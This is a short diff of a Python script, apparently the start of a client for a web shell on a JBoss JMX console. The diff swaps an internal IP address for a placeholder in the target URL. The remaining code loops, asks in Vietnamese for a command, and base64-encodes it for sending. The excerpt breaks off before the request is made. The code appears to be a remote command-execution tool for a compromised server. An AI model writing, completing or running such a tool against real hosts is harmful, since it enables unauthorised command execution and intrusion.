@@ -1,6 +1,6 @@
 import base64, requests
 
-URL = "http://10.1.16.43:8080/jmx-console/service.jsp"
+URL = "http://xxx:8080/jmx-console/service.jsp"
 while 1:
     sample_string = raw_input('Hay nhap cau lenh=')
     sample_string_bytes = sample_string.encode("ascii")
